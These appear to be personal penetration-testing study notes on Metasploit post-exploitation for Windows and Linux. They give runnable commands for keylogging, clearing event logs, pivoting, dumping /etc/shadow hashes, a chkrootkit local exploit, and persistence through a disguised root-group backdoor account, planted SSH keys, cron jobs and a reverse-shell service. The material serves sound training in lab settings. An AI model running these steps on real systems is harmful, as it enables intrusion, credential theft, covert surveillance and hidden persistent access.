# 1.2.2.5 Post Exploitation

## ​[Post Exploitation](https://www.offsec.com/metasploit-unleashed/msf-post-exploitation/) with MSF <a href="#post-exploitation-with-msf" id="post-exploitation-with-msf"></a>

🗒️ **Post Exploitation** is the process of gaining further information or access to the target's internal network, after the initial exploitation phase, using various techniques like:

* **local enumeration**
* ​[**privilege escalation**](https://www.offsec.com/metasploit-unleashed/privilege-escalation/)​
* **maintaining persistent access**
* ​[**pivoting**](https://www.offsec.com/metasploit-unleashed/pivoting/)​
* **dumping hashes**
* **covering tracks**

There are many post exploitation modules provided by the MSF.🗒️ **Persistence** consists of techniques used by adversaries _to maintain access to systems across restarts, changed credentials, or other interruptions_.🗒️ [**Keylogging**](https://www.offsec.com/metasploit-unleashed/keylogging/) is the action of (secretly) _recording/capturing the keystrokes entered on a target system_.🗒️ **Pivoting** is a post exploitation technique of using a compromised host, a **`foothold`** / **`plant`**, to attack other systems on its private internal network.

## Fundamentals - [Meterpreter](https://www.offsec.com/metasploit-unleashed/about-meterpreter/)​ <a href="#fundamentals-meterpreter" id="fundamentals-meterpreter"></a>

Meterpreter is a post-exploitation payload used in penetration testing and ethical hacking. It is primarily associated with the Metasploit Framework, a popular penetration testing and exploitation tool. Meterpreter provides a powerful and flexible means for an attacker to interact with a compromised system after gaining initial access. Its functions and capabilities include:

1. **Remote Control**: Meterpreter allows an attacker to maintain control over a compromised system remotely. It provides a command-line interface (CLI) that allows the attacker to execute various commands on the target system.
2. **File System Manipulation**: An attacker can use Meterpreter to browse, upload, download, and manipulate files and directories on the compromised system. This can be useful for exfiltrating data, planting files, or carrying out other malicious activities.
3. **Privilege Escalation**: Meterpreter can be used to escalate privileges on the target system, enabling the attacker to gain administrator or root-level access, which provides greater control over the system.
4. **Port Forwarding**: It allows the attacker to set up port forwarding on the compromised system, which can be used to pivot through the target system to reach other systems on the network.
5. **Network Enumeration and Exploitation**: Meterpreter can gather information about the compromised system's network configuration, such as open ports and active connections. It can also be used to exploit vulnerabilities in other systems on the network.
6. **Screenshot Capture**: The attacker can capture screenshots of the target system's desktop, providing visual information about what the user is currently doing.
7. **Keylogging**: Meterpreter can log keystrokes on the compromised system, which can be used to capture sensitive information such as login credentials.
8. **Shell Access**: Meterpreter provides a fully interactive shell, allowing the attacker to run arbitrary commands on the target system. This shell can be upgraded to a more stable and feature-rich shell.
9. **Persistence**: It can be used to establish persistence on the compromised system, ensuring that the attacker can regain access even if the system is rebooted or undergoes maintenance.
10. **Automated Post-Exploitation Modules**: Metasploit includes a wide range of post-exploitation modules that leverage Meterpreter for various tasks, making it easier for attackers to carry out specific actions on the compromised system.
11. **Scriptable and Extendable**: Meterpreter can be scripted and extended to create custom post-exploitation capabilities, allowing attackers to tailor their activities to the specific target environment.

* 📌 **MSF has various types of `Meterpreter` payloads based on the target environment**

## Windows PE Modules <a href="#windows-pe-modules" id="windows-pe-modules"></a>

Windows post exploitation MSF modules can be used to:

* Enumerate user privileges, logged-on users, installed programs, antiviruses, computers connected to a domain, installed patches and shares
* VM check

> 🔬 Check out the [Windows Post Exploitation with MSF Labs](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/win-post-msf) with **post-exploitation** techniques for various _Windows services_.

### Enabling RDP

**RDP** stands for Remote Desktop Protocol, and it is a proprietary protocol developed by Microsoft. RDP allows one computer to connect to and control another computer remotely over a network connection. This technology is primarily used for remote administration of computers and virtual desktops.

RDP uses TCP port 3389 by default and is disabled by default on Windows systems, but, we can utilize an MSF exploit to **enable RDP** and consequently utilize it to connect on the target system.

After exploiting the target and starting Meterpreter Shell, we can search and use this module:

```bash
search enable_rdp
use post/windows/manage/enable_rdp
```

set session to meterpreter's session number and exploit.

To check if RDP is enabled (3389 open port), we can do a db\_nmap scan on port 3389

Back on the last meterpreter's session, we change credentials:

```bash
sessions 1
shell
net users #list all users
net user administrator new_psw #change psw
```

#### Connecting with RDP from Linux

If we want to use RDP to access from linux, we can use this tool: **xfreerdp:**

```bash
xfreerdp /u:administrator /p:new_psw /v:IP
```

A good things to do is create and access with a new windows account and utilize it.

### Windows Keylogging <a href="#linux-pe-modules" id="linux-pe-modules"></a>

A **keylogger,** short for "keystroke logger," is a type of software or hardware device that records the keystrokes made on a computer or mobile device keyboard without the user's knowledge or consent. The primary purpose of a keylogger is to monitor and record everything a user types, including usernames, passwords, messages, and any other text entered via the keyboard.

Keyloggers can be used for both legitimate and malicious purposes:

1. **Legitimate Use:**
   * **Security Monitoring:** Some organizations and individuals use keyloggers for security purposes to monitor and log activity on their own systems. This can help detect unauthorized access or suspicious behavior.
   * **Parental Control:** Parents may use keyloggers to monitor their children's online activities and ensure they are using the internet responsibly.
   * **Employee Monitoring:** Employers may use keyloggers to monitor employee activities on company-owned devices to ensure compliance with company policies.
2. **Malicious Use:**
   * **Cybercrime:** Keyloggers can be deployed by cybercriminals to steal sensitive information such as login credentials, credit card numbers, and personal data.
   * **Identity Theft:** Keyloggers can capture personal information that can be used for identity theft or fraud.
   * **Espionage:** State-sponsored actors and espionage organizations may use keyloggers to gather sensitive information from targeted individuals or organizations.

It's the best alternative to RDP, because ther're not interaction with mouse.

To record keyboard, first we need to migrate explorer.exe process In a the meterpreter target session:

```bash
pgrep explorer #give us explorer.exe ppid
migrate explorer_ppid_number
help #show us all comand includes keylogger
```

we can use these three command to manage keylogger process:

```bash
keyscan_start #start rec
keyscan_stop #stop rec
keyscan_dump #dump rec keys
```

## Clearing Windows Event Logs <a href="#linux-pe-modules" id="linux-pe-modules"></a>

### Windows Event Logs

Windows Event Log or Security Audit Log, is a crucial component of the Microsoft Windows operating system that records various events and activities on a Windows-based computer or server. These logs are essential for monitoring system and security-related events, troubleshooting issues, and identifying potential security threats. There are three primary categories of Windows Audit Logs:

1. **Security Log**: This log records security events such as login attempts, privilege usage, and resource access. It is a valuable tool for tracking user activity and detecting potential security breaches. Common security events logged include:
   * Successful and failed logon attempts.
   * Account lockouts.
   * Changes to user or group memberships.
   * Object access (file and folder access).
   * Security policy changes.
   * Authentication and authorization events.
2. **Application Log**: This log records events related to applications, including both Windows system components and third-party software. It can help diagnose issues with software installations or usage. Common application events logged include:
   * Application crashes and errors.
   * Installation and configuration events.
   * Updates and patch installations.
   * Service start and stop events.
3. **System Log**: This log records events related to the operating system's core components and drivers. It is crucial for troubleshooting system-related issues. Common system events logged include:
   * System startup and shutdown events.
   * Driver and hardware-related errors.
   * Disk and file system errors.
   * Service control events.

To access the Windows Audit Log and view these logs, you can use the Windows Event Viewer. Here's how to access it:

1. **Press Win + X**: This will open the Power User menu. From there, select "Event Viewer."
2. **In the Event Viewer**: Expand the "Windows Logs" section to access the various logs, including Security, Application, and System logs.
3. **Select the desired log**: Double-click on one of the logs to view its entries. You can filter, search, and analyze events based on specific criteria.

#### 🗒️ **Windows Event Logs**, accessed via the `Event Viewer` on Windows, are categorized into:

* `Application logs` - apps startups, crashes, etc
* `System logs` - system startups, reboots, etc
* `Security logs` - password changes, authentication failures/success, etc

#### How to clear event logs?

Clearing event logs is an important part of the system assessment, in additional, it's important to delete files uploade on target system.

In a the meterpreter target session we can use these commands to delete event logs:

```bash
shell #launch shell in meterpreter
net user administrator New_Psw # change administrator psw, as malicious activity
exit #terminate current session
clearev #wipe last log records, and generate a new log 'The audit log was cleared'
```

### Pivoting <a href="#linux-pe-modules" id="linux-pe-modules"></a>

**Pivoting** with two targets in two different subnets (Subnet A and Subnet B) involves a scenario where an attacker gains access to one system in one subnet (the initial entry point) and then uses that compromised system to move laterally into another subnet, where they target two different systems. This is an advanced attack technique that requires the attacker to breach network boundaries and potentially access resources in different network segments.

Here's a simplified example:

**Scenario:**

* Subnet A: Contains the compromised system (Initial Entry Point) and Target 1.
* Subnet B: Contains Target 2.

**Attack Steps:**

1. **Initial Compromise:** The attacker gains access to a system in Subnet A, which serves as their initial entry point into the network.
2. **Exploration:** The attacker performs reconnaissance to identify other systems in Subnet A and learns that Subnet B is part of the network.
3. **Pivot to Subnet B:** Using the compromised system in Subnet A as a pivot point, the attacker attempts to move into Subnet B. This might involve exploiting vulnerabilities, using stolen credentials, or employing other methods to breach the perimeter between the two subnets.
4. **Access Target 2:** Once inside Subnet B, the attacker identifies and gains access to Target 2.
5. **Access Target 1:** The attacker may choose to pivot back to Subnet A using the compromised system in Subnet B as a pivot point. From there, they identify and gain access to Target 1 in Subnet A.

#### Example

After exploiting the target and starting Meterpreter Shell, we can rename session 1 to "victim-1" to facilitate our work:

```bash
sessions -n victim-1 -i 1
```

Now, we need to find subnet of victim 2, then we use ifconfig command, and add it to our network:

```bash
run autoroute -s IP/Subnet
```

After that, we need to find open port on the second target using portscan module:

```bash
background
search portscan
use auxiliary/scanner/portscan/tcp #check open port
```

If we find open ports (f.e. port 80), but we can't see service version. For do this, we need to do port forwarding to execute nmap scan:

```bash
session 1 #restart session 1
portfwd add -l 1234 -p 80 -r IP_Victim-2 #add open port 80 to 1234 localport (local tcp relay)
db_nmap -sS -sV -p 1234 localhost #nmap service vs scan on 1234 port of localhost
```

Searching on browser 127.0.0.1:1234 we can see website, but it's not rendering correctly, because it's not running on the target system.

Then, we can exploit vulnerabilities of target 2 and set bind tcp payload:

```bash
set payload windows/meterpreter/bind_tcp
```

**Bind TCP** refers to a program or service to listen for incoming connections on a specific network address (IP address) and port. It's a way to enable communication between devices over a network.

```bash
set RHOSTS IP_Victim-2 #ip target 2
set LPORT 4433 #different than the previous port, because it's occuped
```

and after exploit, it's a good thing rename session:

```bash
sessions -n victim-2 -i 2
```

## Linux PE Modules <a href="#linux-pe-modules" id="linux-pe-modules"></a>

Linux post exploitation MSF modules can be used to:

* Enumerate system configuration, environment variables, network configuration, user's history
* VM check

> 🔬 Check out the [Linux Post Exploitation with MSF Labs](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/linux-post-msf) with **post-exploitation** techniques for various _Unix services_.

After exploiting the target and starting Meterpreter Shell, we can explore info about target, f.e.:

```bash
sysinfo
getuid
cat /etc/passwd #if we're root user, to enumerate all users and services
groups name_user #find group name of specified account
cat /etc/*issue #release distribution version
uname -r #kernel version
uname -a #hostname, kernel and architecture version
ip a s #interfaces available
netstat -antp #services listening on open ports
ps aux #process running on the system
env #enumerate environment variables
sessions -u 1 #create a new meterpreter session
```

then, we can enumerate target with post exploitation modules:

* enum\_configs: enumerates linux configuration files.

```bash
search enum_configs
use post/linux/gather/enum_configs
```

* env: enumerates generic operating system environment.

```bash
search env platform:linux
use post/multi/gather/env
```

* enum\_network: collects all network information (ssh conf, routing table, firewall conf, dns conf, etc).

```bash
search enum_network
use post/linux/gather/enum_network
```

to explore more info, we can open with `cat` command the filepath.

* enum\_protections: checks whether popular system hardening mechanisms are in place, such as: SMEP, SMAP, SELinux, PaX and grsecurity.

```bash
search enum_protections
use post/linux/gather/enum_protections
```

* enum\_system: collects installed packages, services, mount information, user list, bash history and cron jobs.

```bash
search enum_system
use post/linux/gather/enum_system
```

* checkcontainer: checks if system use container (good for priv esc).

```bash
search checkcontainer
use post/linux/gather/checkcontainer
```

* checkvm: checks if system use VM.

```bash
search checkvm
use post/linux/gather/checkvm
```

* checkvm: checks if system use VM.

```bash
search checkvm
use post/linux/gather/checkvm
```

* enum\_users\_history gets users history.

```bash
search enum_users_history 
use post/linux/gather/enum_users_history
```

#### Others

**chkrootkit** is a tool to locally check for signs of a [rootkit](https://www.chkrootkit.org/links/). It contains:

* chkrootkit: shell script that checks system binaries for rootkit modification.
* ifpromisc.c: checks if the interface is in promiscuous mode.
* chklastlog.c: checks for lastlog deletions.
* chkwtmp.c: checks for wtmp deletions.
* check\_wtmpx.c: checks for wtmpx deletions. (Solaris only)
* chkproc.c: checks for signs of LKM trojans.
* chkdirs.c: checks for signs of LKM trojans.
* strings.c: quick and dirty strings replacement.
* chkutmp.c: checks for utmp deletions.

If chkrootkit is running on target machine, and vs is less than 0.5, we can exploit it.

```bash
ps aux #process running on the system
cat /bin/check-down #see check-down source code
chkrootkit —help
chkrootkit -V #version, if it's less than 0.5, we can exploit it
search chkrootkit
use exploit/unix/local/chkrootkit
```

### Duping Hashes With Hashdump

In Linux OS hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges.

Of course, in MSF there're a module called hashdump to dump linux user hashes from the /etc/shadow file and can also be used to unshadow the hashes for password cracking with [John the Ripper](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/john-the-ripper) tool.

After exploiting the target and starting Meterpreter Shell, we need to check if the target has root permission using getuid command, or we need to elevate it.

```bash
getuid
Server username: uid=0, gid=0, euid=0, egid=0
```

uid equals to 0 means that we've root permissions, then we can use meterpreter hashdump module:

```
search hashdump
use post/linux/gather/hashdump

This exploit generates a txt file with all hashes, we can see list of dump with `loot` command and read them using `cat` command.

After it, we can launch shell /bin/bash and f.e. change root psw:

```bash
shell
/bin/bash -i
passwd root
Enter new UNIX password: new_psw
Retype new UNIX password: new_psw
passed: password updated successfully
```

or we can add a new user:

```bash
useradd -m new_usr -s /bin/bash #and add psw
```

Analyzing root hash of /etc/shadow, file we can see that&#x20;

```
root:$y$j9T$hl8nD2cY/WEF55crjicKw1$7/bAEYLkcpy9sZJ1rZMYX9bFQLJj88qKomFAPB2QDEC:19566:0:99999:7:::
```

the initial characters of the password field value in _/etc/shadow_ identify the encryption algorithm:

* _$1$_ is [Message Digest 5 (MD5)](https://www.baeldung.com/cs/md5-vs-sha-algorithms#md5)
* _$2a$_ is [_blowfish_](https://www.baeldung.com/cs/des-vs-3des-vs-blowfish-vs-aes#3-blowfish)
* _$5$_ is [256-bit Secure Hash Algorithm (SHA-256)](https://www.baeldung.com/cs/md5-vs-sha-algorithms#sha-2)
* _$6$_ is [512-bit Secure Hash Algorithm (SHA-512)](https://www.baeldung.com/cs/md5-vs-sha-algorithms#1-security-1)
* _$y$_ (or _$7$_) is [_yescrypt_](https://www.openwall.com/yescrypt/)
* none of the above means DES

Critically, as of this writing, _**yescrypt**_**&#x20;with its contest entry** [_**yescrypt v2**_](https://www.password-hashing.net/submissions/specs/yescrypt-v2.pdf) **and** [**current specification**](https://github.com/openwall/yescrypt/blob/main/README)**, is widely-adopted and the default password hashing scheme for many recent versions of major distributions** like [Debian](https://www.debian.org/) 11/12, [Fedora](https://getfedora.org/) 35+, [Kali Linux](https://www.kali.org/get-kali/) 2021.1+, and [Ubuntu](https://ubuntu.com/) 22.04+. Further, it’s supported on Fedora 29+ and [RHEL](https://www.redhat.com/en) 9+. Still, many standard tools still don’t support _yescrypt_.

**Unlike Windows, on Linux we cannot use the hash to authenticate ourselves.**

### Establishing Persistence On Linux

#### Create backdoor user

NB: This technic only work if the target server is running with SSH or a remote access protocol, that can provide us with access whenever we need it (with usr and psw).

After exploiting the target and starting Meterpreter Shell, we need to check if the target has root permission using getuid command, or we need to elevate it.

```bash
shell
/bin/bash -i
cat /etc/passwd
#see it and make sure that account/service name that we want to use doesn't exist
useradd -m ftp -s /bin/bash #if we want to /var/www/html to make service less than clandestine
passwd ftp #create psw
usermod -aG root ftp #provides administrative or root privileges at ftp account
groups ftp #checks group of ftp account
usermod -u 15 ftp #optional, it's only to take ftp account less clandestine, UID (user identifier) is the unique number assigned to the user upon account creation
```

Now, we can use MSF module to take linux persistence using SSK Key (it's more reccomended because if the connection goes down, we can restablish it and in add, it's difficult to detect than others, infact we never need to change psw on the target system).

In details, this module will add an SSH key to a specified user (or all), to allow remote login via SSH at any time. If we don't specify user, module will add an SSH key to all users by default.

If we log in as the root user, it's not a suspicious activity, because if we both log in on the same account, we can't understand the detection.

```bash
search platform:linux persistence
use post/linux/manage/sshkey_persistence #it works with SSH private keys
show options
set CREATESSHFOLDER true #create ssh folder, becase target system may havve not the SSH folder already created
set SESSION number
```

After exploit it, will be added public key in all user accounts home directory and save in a txt file and see it with path visibile by`loot` command. After that, we can terminate all sessions `exit -y,` opening txt file that contains id rsa, and copy private key in a new file:

```bash
vim ssh_key #copy here and save contents of ssh private key
chmod 0400 ssh_key
ssh -i ssh_key root@IP #user@IP
```

We're in without creating a new user, cronjob or other.

In alternatively, we can use MSF module to take linux persistence using cron jobs:

```bash
search platform:linux persistence
use exploit/linux/local/cron_persistence #it's not the best solution, because update of cronjobs is easy to detect
show options
sessions #check if there're not conflict with others sessions LHOST ports (under connection)
```

If it doesn't work or in alternatively, we can use service\_persistence module (it creates a service on the box, and mark it for autorestart):

```bash
search platform:linux persistence
use exploit/linux/local/service_persistence
set payload cmd/unix/reverse_python #in alternative bind or reverse netcat
#check if there're not conflict with others sessions LHOST ports (under connection)
```
